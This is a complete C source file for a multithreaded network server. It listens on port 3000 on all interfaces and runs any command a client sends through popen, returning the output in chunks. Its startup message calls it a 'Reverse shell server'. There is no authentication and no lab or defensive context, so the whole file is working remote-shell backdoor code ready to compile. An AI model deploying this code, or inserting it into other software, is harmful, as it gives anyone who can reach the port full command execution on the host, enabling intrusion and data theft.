#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>

#define PORT 3000
#define BUFFER_SIZE 1024
#define MAX_CHUNK_SIZE 1024

// Function to check if a string is empty or contains only whitespace
int is_empty_or_whitespace(const char *s)
{
    while (*s)
    {
        if (!isspace((unsigned char)*s))
        {
            return 0;
        }
        s++;
    }
    return 1;
}

// Function to send data in chunks
void send_chunked_data(int client_sock, const char *data, size_t data_len)
{
    size_t bytes_sent = 0;

    // Send data in chunks
    while (bytes_sent < data_len)
    {
        // Calculate chunk size
        size_t remaining = data_len - bytes_sent;
        int chunk_size = remaining < MAX_CHUNK_SIZE ? remaining : MAX_CHUNK_SIZE;

        // Send chunk size in network byte order
        int network_chunk_size = htonl(chunk_size);
        if (send(client_sock, &network_chunk_size, sizeof(int), 0) < 0)
        {
            perror("Failed to send chunk size");
            return;
        }

        // Send chunk data
        if (send(client_sock, data + bytes_sent, chunk_size, 0) < 0)
        {
            perror("Failed to send chunk data");
            return;
        }

        bytes_sent += chunk_size;
    }

    // Send a zero-sized chunk to indicate end of data
    int end_marker = 0;
    send(client_sock, &end_marker, sizeof(int), 0);
}

void *client_handler(void *arg)
{
    int client_sock = *(int *)arg;
    free(arg);
    char command[BUFFER_SIZE];
    char buffer[BUFFER_SIZE];
    ssize_t num_read;

    while (1)
    {
        memset(command, 0, sizeof(command));
        num_read = recv(client_sock, command, sizeof(command) - 1, 0);
        if (num_read <= 0)
        {
            perror("recv failed or connection closed");
            break;
        }
        command[num_read] = '\0';

        // Skip command execution if it's empty.
        if (is_empty_or_whitespace(command))
        {
            const char *empty_msg = "No command provided.\n";
            send_chunked_data(client_sock, empty_msg, strlen(empty_msg));
            continue;
        }

        // Check for "exit" command
        if (strncmp(command, "exit", 4) == 0)
        {
            break;
        }

        // Handling the "cd" command (special case)
        if (strncmp(command, "cd ", 3) == 0)
        {
            char output[BUFFER_SIZE];
            char *dir = command + 3;
            if (dir[0] == '\0')
            {
                dir = getenv("HOME");
            }
            if (chdir(dir) != 0)
            {
                snprintf(output, sizeof(output), "cd: %s: %s\n", dir, strerror(errno));
            }
            else
            {
                char cwd[1024];
                if (getcwd(cwd, sizeof(cwd)) != NULL)
                {
                    snprintf(output, sizeof(output), "Directory changed to: %s\n", cwd);
                }
                else
                {
                    snprintf(output, sizeof(output), "cd: error retrieving current directory\n");
                }
            }
            send_chunked_data(client_sock, output, strlen(output));
            continue;
        }

        // Execute general commands via popen
        FILE *fp = popen(command, "r");
        if (fp == NULL)
        {
            const char *error_msg = "Failed to execute command.\n";
            send_chunked_data(client_sock, error_msg, strlen(error_msg));
        }
        else
        {
            // Read and send command output in chunks
            size_t bytes_read;
            while ((bytes_read = fread(buffer, 1, sizeof(buffer), fp)) > 0)
            {
                // Send this chunk of data
                int chunk_size = htonl(bytes_read);
                send(client_sock, &chunk_size, sizeof(int), 0);
                send(client_sock, buffer, bytes_read, 0);
            }

            // Signal end of data
            int end_marker = 0;
            send(client_sock, &end_marker, sizeof(int), 0);

            pclose(fp);
        }
    }

    close(client_sock);
    pthread_exit(NULL);
}

int main()
{
    int server_sock, *client_sock_ptr;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    memset(&(server_addr.sin_zero), '\0', 8);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("bind failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    if (listen(server_sock, 5) < 0)
    {
        perror("listen failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("Reverse shell server listening on port %d...\n", PORT);

    while (1)
    {
        int *client_sock = malloc(sizeof(int));
        if ((*client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len)) < 0)
        {
            perror("accept failed");
            free(client_sock);
            continue;
        }
        printf("Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        pthread_t tid;
        if (pthread_create(&tid, NULL, client_handler, client_sock) != 0)
        {
            perror("Failed to create thread");
            close(*client_sock);
            free(client_sock);
            continue;
        }
        pthread_detach(tid);
    }

    close(server_sock);
    return 0;
}